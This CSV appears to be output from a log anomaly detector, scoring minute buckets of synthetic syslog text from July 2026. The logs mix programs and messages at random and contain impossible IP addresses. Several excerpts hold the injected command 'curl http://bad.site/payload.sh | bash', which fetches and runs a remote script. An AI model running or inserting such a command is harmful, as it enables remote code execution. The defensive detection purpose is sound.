bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 19:35:00,0.998981874821595,1,1,0.8224995273096307,3,56,unattended-upgrades: Started Cleanup of Temporary Directories. || chronyd: kernel: Out of memory: Kill process 27438 (python3) score 987 or sacrifice child || docker: Rotating log files. || docker: Accepted publickey for user from 10.0.0.161 port 22 
2026-07-01 19:36:00,0.9996216861240682,1,1,0.8224995273096307,3,59,sshd: Started Cleanup of Temporary Directories. || sshd: Started CUPS Scheduler. || docker: Rotating log files. || NetworkManager: Synced RTC time from system clock. || NetworkManager: Accepted publickey for user from 10.0.0.28 port 22 ssh2. || docke
2026-07-01 19:37:00,0.9998071036272227,1,1,0.8224995273096307,3,59,logrotate: Finished Daily apt download activities. || CRON: Started CUPS Scheduler. || telnetd: Synced RTC time from system clock. || unattended-upgrades: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.26411 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || 
2026-07-01 19:38:00,0.9994189397063171,1,1,0.8224995273096307,3,58,named: Rotating log files. || unattended-upgrades: Started Cleanup of Temporary Directories. || gpm: Started CUPS Scheduler. || telnetd: Listening on LVM2 poll daemon socket. || systemd: Synced RTC time from system clock. || smartd: Rotating log file
2026-07-01 19:39:00,0.9997865720664867,1,1,0.8224995273096307,3,56,chronyd: Rotating log files. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || named: Synced RTC time from system clock. || telnetd: Listening on LVM2 poll daemon socket. || systemd: Started Session c225 of user root. || chronyd: Finishe
2026-07-01 19:40:00,0.9998587124408287,1,1,0.8224995273096307,3,60,systemd: Accepted publickey for user from 10.0.0.70 port 22 ssh2. || NetworkManager: Finished Daily apt download activities. || gpm: Finished Daily apt download activities. || xinetd: Started Cleanup of Temporary Directories. || ftpd: Accepted public
2026-07-01 19:41:00,0.9995181010675207,1,1,0.8224995273096307,3,57,ntpd: Started CUPS Scheduler. || chronyd: Started Session c222 of user root. || cups: Listening on LVM2 poll daemon socket. || telnetd: Started CUPS Scheduler. || systemd: Listening on LVM2 poll daemon socket. || ftpd: Finished Daily apt download act
2026-07-01 19:42:00,0.9983975427718946,1,1,0.8224995273096307,3,56,ufw: Finished Daily apt download activities. || named: Listening on LVM2 poll daemon socket. || sudo: Started Session c75 of user root. || sudo: Synced RTC time from system clock. || ufw: Listening on LVM2 poll daemon socket. || sudo: Started Session
2026-07-01 19:43:00,0.999800938829196,1,1,0.8224995273096307,3,59,xinetd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || smartd: Listening on LVM2 poll daemon socket. || dockerd: Synced RTC time from system clock. || ftpd: Started CUPS Scheduler. || unix_chkpwd: 
2026-07-01 19:44:00,0.9999072979592668,1,1,0.8224995273096307,3,63,unattended-upgrades: Listening on LVM2 poll daemon socket. || unattended-upgrades: kernel: Out of memory: Kill process 60628 (python3) score 987 or sacrifice child || docker: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (c
2026-07-01 19:45:00,0.9999967263504504,1,1,0.8224995273096307,3,61,NetworkManager: Started Session c77 of user root. || logrotate: Rotating log files. || logrotate: Finished Daily apt download activities. || ntpd: Started Cleanup of Temporary Directories. || redis-server: Synced RTC time from system clock. || ufw: A
2026-07-01 19:46:00,0.9998639158169257,1,1,0.8224995273096307,3,57,telnetd: Started Cleanup of Temporary Directories. || CRON: Rotating log files. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || telnetd: Listening on LVM2 poll daemon socket. || rsyslogd: Started Session c84 of user root. || kernel: Ac
2026-07-01 19:47:00,0.9996270415263311,1,1,0.8224995273096307,3,63,sudo: Synced RTC time from system clock. || xinetd: Finished Daily apt download activities. || named: Started Cleanup of Temporary Directories. || NetworkManager: Accepted publickey for user from 10.0.0.80 port 22 ssh2. || systemd-timesyncd: Rotating
2026-07-01 19:48:00,0.9999281609410607,1,1,0.8224995273096307,3,55,NetworkManager: Accepted publickey for user from 10.0.0.218 port 22 ssh2. || systemd-timesyncd: Started Session c50 of user root. || ftpd: Finished Daily apt download activities. || systemd: Started Session c37 of user root. || NetworkManager: Rotati
2026-07-01 19:49:00,0.9999498382964971,1,1,0.8224995273096307,3,60,dockerd: Started Cleanup of Temporary Directories. || redis-server: Started CUPS Scheduler. || logrotate: Synced RTC time from system clock. || cups: Synced RTC time from system clock. || named: Started Session c42 of user root. || CRON: Accepted pub
2026-07-01 19:50:00,0.9999074754447603,1,1,0.8224995273096307,3,58,cups: Synced RTC time from system clock. || ftpd: Synced RTC time from system clock. || redis-server: Accepted publickey for user from 10.0.0.51 port 22 ssh2. || logrotate: Started Session c185 of user root. || sshd: Synced RTC time from system clock
2026-07-01 19:51:00,0.9999019653011318,1,1,0.8224995273096307,3,60,ufw: Finished Daily apt download activities. || ufw: Started Cleanup of Temporary Directories. || unix_chkpwd: Accepted publickey for user from 10.0.0.134 port 22 ssh2. || logrotate: Listening on LVM2 poll daemon socket. || ftpd: Rotating log files. 
2026-07-01 19:52:00,0.9999517979416799,1,1,0.8224995273096307,3,61,systemd-timesyncd: Rotating log files. || ftpd: Finished Daily apt download activities. || unattended-upgrades: Started CUPS Scheduler. || ufw: Synced RTC time from system clock. || docker: Started Session c24 of user root. || gpm: Listening on LVM2 
2026-07-01 19:53:00,0.999486399495527,1,1,0.8224995273096307,3,60,CRON: Started CUPS Scheduler. || ftpd: Accepted publickey for user from 10.0.0.249 port 22 ssh2. || logrotate: Started Cleanup of Temporary Directories. || telnetd: Started Cleanup of Temporary Directories. || chronyd: Accepted publickey for user fro
2026-07-01 19:54:00,0.997053915382743,1,1,0.8224995273096307,3,61,sshd: Finished Daily apt download activities. || gpm: Listening on LVM2 poll daemon socket. || unattended-upgrades: Started CUPS Scheduler. || ftpd: Started CUPS Scheduler. || dockerd: Started Session c88 of user root. || ntpd: Started Cleanup of Tem
2026-07-01 19:55:00,0.9998874445126573,1,1,0.8224995273096307,3,61,rsyslogd: Finished Daily apt download activities. || logrotate: Finished Daily apt download activities. || xinetd: Started Cleanup of Temporary Directories. || xinetd: Started CUPS Scheduler. || xinetd: Started Session c12 of user root. || ufw: app[1
2026-07-01 19:56:00,0.9999734605011101,1,1,0.8224995273096307,3,55,xinetd: Listening on LVM2 poll daemon socket. || cups: Failed password for invalid user test from 192.168.1.9004 port 22 ssh2 || sudo: Accepted publickey for user from 10.0.0.55 port 22 ssh2. || telnetd: Accepted publickey for user from 10.0.0.182 po
2026-07-01 19:57:00,0.999982617551187,1,1,0.8224995273096307,3,61,CRON: Synced RTC time from system clock. || chronyd: Started Cleanup of Temporary Directories. || rsyslogd: Accepted publickey for user from 10.0.0.252 port 22 ssh2. || NetworkManager: Accepted publickey for user from 10.0.0.81 port 22 ssh2. || Netwo
2026-07-01 19:58:00,0.9998372442655848,1,1,0.8224995273096307,3,61,dockerd: Synced RTC time from system clock. || chronyd: Started CUPS Scheduler. || dockerd: Started CUPS Scheduler. || docker: Started Cleanup of Temporary Directories. || ufw: Finished Daily apt download activities. || kernel: Rotating log files. ||
2026-07-01 19:59:00,0.999902493340683,1,1,0.8224995273096307,3,59,unattended-upgrades: Synced RTC time from system clock. || smartd: Listening on LVM2 poll daemon socket. || ntpd: Synced RTC time from system clock. || telnetd: Rotating log files. || gpm: Listening on LVM2 poll daemon socket. || unattended-upgrades:
2026-07-01 20:00:00,0.9999419684918316,1,1,0.8224995273096307,3,61,CRON: Synced RTC time from system clock. || logrotate: Accepted publickey for user from 10.0.0.16 port 22 ssh2. || unattended-upgrades: Listening on LVM2 poll daemon socket. || systemd: Finished Daily apt download activities. || systemd: Started Sess
2026-07-01 20:01:00,0.9991382480314728,1,1,0.8224995273096307,3,56,telnetd: Finished Daily apt download activities. || kernel: Listening on LVM2 poll daemon socket. || sshd: Rotating log files. || redis-server: Started Cleanup of Temporary Directories. || dockerd: Started Cleanup of Temporary Directories. || xinetd:
2026-07-01 20:02:00,0.9983394597217404,1,1,0.8224995273096307,3,59,ufw: Accepted publickey for user from 10.0.0.28 port 22 ssh2. || dockerd: Finished Daily apt download activities. || dockerd: Started Cleanup of Temporary Directories. || systemd: Finished Daily apt download activities. || rsyslogd: bash: -c: line 1:
2026-07-01 20:03:00,0.9965972357565026,1,1,0.8224995273096307,3,58,telnetd: Started Cleanup of Temporary Directories. || ufw: Started Session c234 of user root. || kernel: Started Session c71 of user root. || unattended-upgrades: Accepted publickey for user from 10.0.0.209 port 22 ssh2. || ftpd: Started Cleanup of T
2026-07-01 20:04:00,0.9996959053360719,1,1,0.8224995273096307,3,57,ufw: Finished Daily apt download activities. || ntpd: Rotating log files. || unix_chkpwd: Started Cleanup of Temporary Directories. || smartd: Finished Daily apt download activities. || ufw: Accepted publickey for user from 10.0.0.197 port 22 ssh2. |
2026-07-01 20:05:00,0.9979501172795501,1,1,0.8224995273096307,3,59,unattended-upgrades: Started Cleanup of Temporary Directories. || smartd: Listening on LVM2 poll daemon socket. || redis-server: Started Session c250 of user root. || smartd: Rotating log files. || CRON: kernel: Out of memory: Kill process 53914 (pyt
2026-07-01 20:06:00,0.9993861954318465,1,1,0.8224995273096307,3,58,systemd: Rotating log files. || named: Finished Daily apt download activities. || cups: Started Cleanup of Temporary Directories. || NetworkManager: Listening on LVM2 poll daemon socket. || xinetd: Listening on LVM2 poll daemon socket. || docker: Rot
2026-07-01 20:07:00,0.9998858381751515,1,1,0.8224995273096307,3,59,smartd: Accepted publickey for user from 10.0.0.115 port 22 ssh2. || xinetd: Rotating log files. || redis-server: Started Session c28 of user root. || systemd: Started Session c82 of user root. || NetworkManager: Started Cleanup of Temporary Director
2026-07-01 20:08:00,0.999840138479056,1,1,0.8224995273096307,3,61,systemd: kernel: Out of memory: Kill process 43395 (python3) score 987 or sacrifice child || gpm: Rotating log files. || named: Started CUPS Scheduler. || unix_chkpwd: Listening on LVM2 poll daemon socket. || smartd: Synced RTC time from system clock
2026-07-01 20:09:00,0.999873220541774,1,1,0.8224995273096307,3,59,rsyslogd: Started Session c226 of user root. || sudo: Started CUPS Scheduler. || dockerd: Listening on LVM2 poll daemon socket. || redis-server: Synced RTC time from system clock. || systemd: Finished Daily apt download activities. || systemd: Starte
2026-07-01 20:10:00,0.9998076491270493,1,1,0.8224995273096307,3,58,systemd-timesyncd: Finished Daily apt download activities. || chronyd: Synced RTC time from system clock. || gpm: Accepted publickey for user from 10.0.0.126 port 22 ssh2. || telnetd: Started Session c149 of user root. || rsyslogd: Listening on LVM2 
2026-07-01 20:11:00,0.9999930953876656,1,1,0.8224995273096307,3,61,telnetd: Finished Daily apt download activities. || docker: Started Session c233 of user root. || telnetd: Synced RTC time from system clock. || ufw: Listening on LVM2 poll daemon socket. || ntpd: Listening on LVM2 poll daemon socket. || smartd: Rota
2026-07-01 20:12:00,0.9999244775741102,1,1,0.8224995273096307,3,59,docker: Started CUPS Scheduler. || sudo: Accepted publickey for user from 10.0.0.126 port 22 ssh2. || smartd: Finished Daily apt download activities. || gpm: kernel: Out of memory: Kill process 61852 (python3) score 987 or sacrifice child || ftpd: Ro
2026-07-01 20:13:00,0.9999607111659717,1,1,0.8224995273096307,3,59,systemd: Rotating log files. || ufw: Accepted publickey for user from 10.0.0.152 port 22 ssh2. || dockerd: Started Cleanup of Temporary Directories. || NetworkManager: Accepted publickey for user from 10.0.0.7 port 22 ssh2. || ntpd: Listening on LVM2
2026-07-01 20:14:00,0.9999556562273074,1,1,0.8224995273096307,3,61,redis-server: Rotating log files. || chronyd: Listening on LVM2 poll daemon socket. || unix_chkpwd: Finished Daily apt download activities. || systemd-timesyncd: Started Cleanup of Temporary Directories. || ntpd: Rotating log files. || ntpd: Accepted
2026-07-01 20:15:00,0.9994245115747817,1,1,0.8224995273096307,3,57,telnetd: Finished Daily apt download activities. || sshd: Listening on LVM2 poll daemon socket. || kernel: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.24926 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || sudo: Started CUPS Scheduler. || gpm: Rotating l
2026-07-01 20:16:00,0.9984677791713091,1,1,0.8224995273096307,3,57,sshd: Accepted publickey for user from 10.0.0.185 port 22 ssh2. || xinetd: Started Cleanup of Temporary Directories. || dockerd: Finished Daily apt download activities. || logrotate: Started Session c213 of user root. || sshd: Rotating log files. || 
2026-07-01 20:17:00,0.9996408546266007,1,1,0.8224995273096307,3,57,kernel: Started Session c156 of user root. || dockerd: Started Cleanup of Temporary Directories. || sshd: Synced RTC time from system clock. || NetworkManager: Finished Daily apt download activities. || sudo: Finished Daily apt download activities. |
2026-07-01 20:18:00,0.9998370336426577,1,1,0.8224995273096307,3,62,redis-server: Started CUPS Scheduler. || ftpd: Rotating log files. || ntpd: Rotating log files. || ntpd: Started Cleanup of Temporary Directories. || cups: Started CUPS Scheduler. || ufw: Started Session c160 of user root. || chronyd: Rotating log fi
2026-07-01 20:19:00,0.999979700408521,1,1,0.8224995273096307,3,58,gpm: Listening on LVM2 poll daemon socket. || dockerd: Accepted publickey for user from 10.0.0.127 port 22 ssh2. || CRON: Started CUPS Scheduler. || sshd: Finished Daily apt download activities. || CRON: Listening on LVM2 poll daemon socket. || syste
2026-07-01 20:20:00,0.9999852817786664,1,1,0.8224995273096307,3,65,kernel: Accepted publickey for user from 10.0.0.8 port 22 ssh2. || chronyd: Rotating log files. || docker: Started Cleanup of Temporary Directories. || gpm: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.42473 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 |
2026-07-01 20:21:00,0.999869771620012,1,1,0.8224995273096307,3,59,docker: Accepted publickey for user from 10.0.0.230 port 22 ssh2. || ntpd: Listening on LVM2 poll daemon socket. || ufw: Listening on LVM2 poll daemon socket. || kernel: Listening on LVM2 poll daemon socket. || cups: Rotating log files. || docker: [U
2026-07-01 20:22:00,0.9994949425174099,1,1,0.8224995273096307,3,61,NetworkManager: Finished Daily apt download activities. || ftpd: kernel: Out of memory: Kill process 45232 (python3) score 987 or sacrifice child || smartd: Synced RTC time from system clock. || unattended-upgrades: Started Cleanup of Temporary Direc
2026-07-01 20:23:00,0.9995930017424833,1,1,0.8224995273096307,3,62,unix_chkpwd: Listening on LVM2 poll daemon socket. || logrotate: Failed password for invalid user test from 192.168.1.3012 port 22 ssh2 || unattended-upgrades: Started Session c183 of user root. || gpm: Finished Daily apt download activities. || gpm:
2026-07-01 20:24:00,0.9976420638309851,1,1,0.8224995273096307,3,61,kernel: Accepted publickey for user from 10.0.0.23 port 22 ssh2. || logrotate: Finished Daily apt download activities. || redis-server: Listening on LVM2 poll daemon socket. || docker: Started Cleanup of Temporary Directories. || ufw: Listening on LV
2026-07-01 20:25:00,0.9925219338739528,1,1,0.8224995273096307,3,61,CRON: Started CUPS Scheduler. || xinetd: Listening on LVM2 poll daemon socket. || unattended-upgrades: Started CUPS Scheduler. || CRON: Started Cleanup of Temporary Directories. || kernel: Rotating log files. || kernel: Listening on LVM2 poll daemon 
2026-07-01 20:26:00,0.9934682980506689,1,1,0.8224995273096307,3,60,cups: Started CUPS Scheduler. || NetworkManager: Accepted publickey for user from 10.0.0.35 port 22 ssh2. || dockerd: Synced RTC time from system clock. || gpm: Rotating log files. || gpm: Rotating log files. || ntpd: Rotating log files. || sudo: Syn
2026-07-01 20:27:00,0.997605579792549,1,1,0.8224995273096307,3,58,telnetd: Accepted publickey for user from 10.0.0.11 port 22 ssh2. || cups: Failed password for invalid user test from 192.168.1.12901 port 22 ssh2 || named: Started Cleanup of Temporary Directories. || redis-server: Listening on LVM2 poll daemon sock
2026-07-01 20:28:00,0.9981865866727709,1,1,0.8224995273096307,3,62,CRON: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || CRON: Accepted publickey for user from 10.0.0.176 port 22 ssh2. || dockerd: Synced RTC time from system clock. || rsyslogd: Rotating log files. 
2026-07-01 20:29:00,0.9997561640635004,1,1,0.8224995273096307,3,62,CRON: Started Cleanup of Temporary Directories. || chronyd: Accepted publickey for user from 10.0.0.246 port 22 ssh2. || logrotate: Finished Daily apt download activities. || systemd: Started Cleanup of Temporary Directories. || smartd: Started CUPS 
2026-07-01 20:30:00,0.9997288403716367,1,1,0.8224995273096307,3,60,rsyslogd: Started Session c214 of user root. || telnetd: Finished Daily apt download activities. || kernel: Started Session c170 of user root. || docker: Started Cleanup of Temporary Directories. || redis-server: Listening on LVM2 poll daemon socket.
2026-07-01 20:31:00,0.9997877933163245,1,1,0.8224995273096307,3,57,docker: Rotating log files. || gpm: Started CUPS Scheduler. || redis-server: Started CUPS Scheduler. || unattended-upgrades: Started Session c128 of user root. || rsyslogd: Listening on LVM2 poll daemon socket. || cups: Started Session c95 of user ro
2026-07-01 20:32:00,0.9996914955925985,1,1,0.8224995273096307,3,62,cups: Finished Daily apt download activities. || chronyd: Started CUPS Scheduler. || docker: Accepted publickey for user from 10.0.0.64 port 22 ssh2. || gpm: Started Session c102 of user root. || systemd-timesyncd: Listening on LVM2 poll daemon socke
2026-07-01 20:33:00,0.9966844391801913,1,1,0.8224995273096307,3,60,rsyslogd: Started Session c168 of user root. || logrotate: Started Session c125 of user root. || sshd: Started Session c140 of user root. || sudo: Listening on LVM2 poll daemon socket. || redis-server: Accepted publickey for user from 10.0.0.22 port 
2026-07-01 20:34:00,0.9984806918461524,1,1,0.8224995273096307,3,62,smartd: Started CUPS Scheduler. || redis-server: Synced RTC time from system clock. || chronyd: Synced RTC time from system clock. || CRON: Started Cleanup of Temporary Directories. || kernel: Started Cleanup of Temporary Directories. || smartd: Star
2026-07-01 20:35:00,0.9986059818900007,1,1,0.8224995273096307,3,61,dockerd: Accepted publickey for user from 10.0.0.30 port 22 ssh2. || kernel: Rotating log files. || logrotate: Rotating log files. || xinetd: Rotating log files. || smartd: Listening on LVM2 poll daemon socket. || sudo: Listening on LVM2 poll daemon 
2026-07-01 20:36:00,0.9977946768181634,1,1,0.8224995273096307,3,61,unattended-upgrades: Listening on LVM2 poll daemon socket. || dockerd: Rotating log files. || telnetd: Started Session c11 of user root. || telnetd: Started CUPS Scheduler. || CRON: Synced RTC time from system clock. || unix_chkpwd: Listening on LVM2
2026-07-01 20:37:00,0.9957894241751336,1,1,0.8224995273096307,3,58,xinetd: Rotating log files. || smartd: Started CUPS Scheduler. || rsyslogd: Started CUPS Scheduler. || unattended-upgrades: Listening on LVM2 poll daemon socket. || kernel: Rotating log files. || gpm: Rotating log files. || systemd-timesyncd: Started
2026-07-01 20:38:00,0.9993248399566693,1,1,0.8224995273096307,3,58,smartd: Listening on LVM2 poll daemon socket. || sshd: Started Cleanup of Temporary Directories. || unattended-upgrades: Synced RTC time from system clock. || gpm: Accepted publickey for user from 10.0.0.240 port 22 ssh2. || xinetd: Started CUPS Sche
2026-07-01 20:39:00,0.9985109907954642,1,1,0.8224995273096307,3,57,NetworkManager: Accepted publickey for user from 10.0.0.103 port 22 ssh2. || ufw: Listening on LVM2 poll daemon socket. || cups: Accepted publickey for user from 10.0.0.31 port 22 ssh2. || named: Started Cleanup of Temporary Directories. || smartd: F
2026-07-01 20:40:00,0.9926175158492302,1,1,0.8224995273096307,3,60,CRON: Started Session c112 of user root. || sudo: bash: -c: line 1: curl http://bad.site/payload.sh | bash || unix_chkpwd: Synced RTC time from system clock. || chronyd: Synced RTC time from system clock. || CRON: Started Session c182 of user root. |
2026-07-01 20:41:00,0.9972597127850589,1,1,0.8224995273096307,3,58,CRON: Started Session c153 of user root. || unix_chkpwd: Listening on LVM2 poll daemon socket. || gpm: Started Cleanup of Temporary Directories. || NetworkManager: Listening on LVM2 poll daemon socket. || smartd: Synced RTC time from system clock. ||
2026-07-01 20:42:00,0.9986104243141583,1,1,0.8224995273096307,3,63,unix_chkpwd: Started Session c121 of user root. || gpm: Rotating log files. || kernel: Accepted publickey for user from 10.0.0.6 port 22 ssh2. || systemd: Accepted publickey for user from 10.0.0.190 port 22 ssh2. || rsyslogd: Synced RTC time from sys
2026-07-01 20:43:00,0.9986540320591228,1,1,0.8224995273096307,3,64,unix_chkpwd: Started Session c125 of user root. || named: Started CUPS Scheduler. || sshd: Synced RTC time from system clock. || ntpd: Finished Daily apt download activities. || chronyd: Started Cleanup of Temporary Directories. || telnetd: Rotating 
2026-07-01 20:44:00,0.9998404160193641,1,1,0.8224995273096307,3,59,docker: Rotating log files. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started Cleanup of Temporary Directories. || logrotate: Finished Daily apt download activities. || logrotate: Synced RTC time from system cl
2026-07-01 20:45:00,0.9993635181279118,1,1,0.8224995273096307,3,60,chronyd: Listening on LVM2 poll daemon socket. || sshd: Finished Daily apt download activities. || ntpd: Finished Daily apt download activities. || ftpd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || systemd-timesyncd: Started Session c
2026-07-01 20:46:00,0.9996987221685599,1,1,0.8224995273096307,3,60,telnetd: Started CUPS Scheduler. || dockerd: Accepted publickey for user from 10.0.0.154 port 22 ssh2. || sshd: Started CUPS Scheduler. || unattended-upgrades: Started Session c30 of user root. || CRON: Synced RTC time from system clock. || unix_chkp
2026-07-01 20:47:00,0.9997548556286624,1,1,0.8224995273096307,3,61,sudo: Started CUPS Scheduler. || xinetd: Rotating log files. || sudo: Failed password for invalid user test from 192.168.1.38001 port 22 ssh2 || docker: Started CUPS Scheduler. || xinetd: Finished Daily apt download activities. || cups: Started Sessi
2026-07-01 20:48:00,0.9997082730691166,1,1,0.8224995273096307,3,60,ftpd: Accepted publickey for user from 10.0.0.108 port 22 ssh2. || sshd: Accepted publickey for user from 10.0.0.107 port 22 ssh2. || NetworkManager: Accepted publickey for user from 10.0.0.11 port 22 ssh2. || unattended-upgrades: Started CUPS Schedu
2026-07-01 20:49:00,0.9999489404470583,1,1,0.8224995273096307,3,60,named: Synced RTC time from system clock. || CRON: Listening on LVM2 poll daemon socket. || sudo: Started Session c50 of user root. || telnetd: Started Session c37 of user root. || CRON: Accepted publickey for user from 10.0.0.144 port 22 ssh2. || sy
2026-07-01 20:50:00,0.9919973224945181,1,1,0.8224995273096307,3,59,unix_chkpwd: Synced RTC time from system clock. || sudo: Accepted publickey for user from 10.0.0.178 port 22 ssh2. || kernel: Synced RTC time from system clock. || gpm: Started Session c221 of user root. || xinetd: Listening on LVM2 poll daemon socke
2026-07-01 20:51:00,0.9916207117549971,1,1,0.8224995273096307,3,58,docker: Started Cleanup of Temporary Directories. || telnetd: Listening on LVM2 poll daemon socket. || unattended-upgrades: Synced RTC time from system clock. || named: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.29965 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0
2026-07-01 20:52:00,0.986727044684973,1,1,0.8224995273096307,3,62,telnetd: Listening on LVM2 poll daemon socket. || docker: Listening on LVM2 poll daemon socket. || telnetd: Started Cleanup of Temporary Directories. || chronyd: Listening on LVM2 poll daemon socket. || rsyslogd: Started Cleanup of Temporary Director
2026-07-01 20:53:00,0.9907281208384072,1,1,0.8224995273096307,3,59,ftpd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.25261 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || NetworkManager: Finished Daily apt download activities. || kernel: Synced RTC time from system clock. || redis-server: app[1234]: segfault at 0 ip 00
2026-07-01 20:54:00,0.9924023931562491,1,1,0.8224995273096307,3,58,CRON: Started Session c18 of user root. || unix_chkpwd: Started Cleanup of Temporary Directories. || CRON: Accepted publickey for user from 10.0.0.116 port 22 ssh2. || gpm: bash: -c: line 1: curl http://bad.site/payload.sh | bash || gpm: Started Clea
2026-07-01 20:55:00,0.9947405337433791,1,1,0.8224995273096307,3,62,sshd: Rotating log files. || rsyslogd: Started Cleanup of Temporary Directories. || unix_chkpwd: Started CUPS Scheduler. || kernel: Synced RTC time from system clock. || systemd-timesyncd: Accepted publickey for user from 10.0.0.58 port 22 ssh2. || u
2026-07-01 20:56:00,0.9966094246372799,1,1,0.8224995273096307,3,63,smartd: Rotating log files. || ufw: Started CUPS Scheduler. || kernel: Synced RTC time from system clock. || unix_chkpwd: Accepted publickey for user from 10.0.0.167 port 22 ssh2. || gpm: Rotating log files. || redis-server: Started Cleanup of Tempor
2026-07-01 20:57:00,0.9997236958338758,1,1,0.8224995273096307,3,61,kernel: Synced RTC time from system clock. || sudo: Started Session c134 of user root. || gpm: Finished Daily apt download activities. || logrotate: Started Cleanup of Temporary Directories. || cups: Started CUPS Scheduler. || systemd-timesyncd: Star
2026-07-01 20:58:00,0.9992524110238501,1,1,0.8224995273096307,3,63,CRON: Started Session c43 of user root. || ftpd: Rotating log files. || sudo: Listening on LVM2 poll daemon socket. || telnetd: Listening on LVM2 poll daemon socket. || kernel: Listening on LVM2 poll daemon socket. || logrotate: Synced RTC time from 
2026-07-01 20:59:00,0.9976314397992243,1,1,0.8224995273096307,3,60,named: Listening on LVM2 poll daemon socket. || telnetd: Accepted publickey for user from 10.0.0.1 port 22 ssh2. || ftpd: Started CUPS Scheduler. || cups: Started Session c210 of user root. || smartd: Started Cleanup of Temporary Directories. || xine
2026-07-01 21:00:00,0.9876313891910494,1,1,0.8224995273096307,3,62,cups: Rotating log files. || xinetd: kernel: Out of memory: Kill process 11303 (python3) score 987 or sacrifice child || smartd: Rotating log files. || unix_chkpwd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || ftpd: Rotating log files.
2026-07-01 21:01:00,0.9981923193565788,1,1,0.8224995273096307,3,57,rsyslogd: Started Session c196 of user root. || telnetd: Started CUPS Scheduler. || docker: Accepted publickey for user from 10.0.0.226 port 22 ssh2. || logrotate: Synced RTC time from system clock. || named: Finished Daily apt download activities. |
2026-07-01 21:02:00,0.9997302612027907,1,1,0.8224995273096307,3,60,unattended-upgrades: Started Session c124 of user root. || ufw: Accepted publickey for user from 10.0.0.53 port 22 ssh2. || dockerd: Synced RTC time from system clock. || named: Started Cleanup of Temporary Directories. || named: Finished Daily apt d
2026-07-01 21:03:00,0.9975246882548462,1,1,0.8224995273096307,3,63,cups: Synced RTC time from system clock. || redis-server: Synced RTC time from system clock. || ufw: Accepted publickey for user from 10.0.0.121 port 22 ssh2. || xinetd: Finished Daily apt download activities. || kernel: Rotating log files. || named:
2026-07-01 21:04:00,0.991061964736313,1,1,0.8224995273096307,3,62,CRON: Finished Daily apt download activities. || gpm: Listening on LVM2 poll daemon socket. || gpm: Accepted publickey for user from 10.0.0.168 port 22 ssh2. || telnetd: Accepted publickey for user from 10.0.0.225 port 22 ssh2. || ntpd: Started Sessi
2026-07-01 21:05:00,0.9980775707408474,1,1,0.8224995273096307,3,62,xinetd: Started Session c81 of user root. || xinetd: Listening on LVM2 poll daemon socket. || gpm: Synced RTC time from system clock. || ftpd: Started Session c10 of user root. || docker: kernel: Out of memory: Kill process 30385 (python3) score 987 
2026-07-01 21:06:00,0.9956566226882406,1,1,0.8224995273096307,3,60,ftpd: Started Cleanup of Temporary Directories. || named: Accepted publickey for user from 10.0.0.254 port 22 ssh2. || smartd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started CUPS Scheduler. || named: EXT4-fs error (device sda1): 
2026-07-01 21:07:00,0.9901270612845257,1,1,0.8224995273096307,3,59,cups: Finished Daily apt download activities. || named: Started Session c170 of user root. || kernel: Started Session c46 of user root. || telnetd: Synced RTC time from system clock. || systemd-timesyncd: Synced RTC time from system clock. || CRON: A
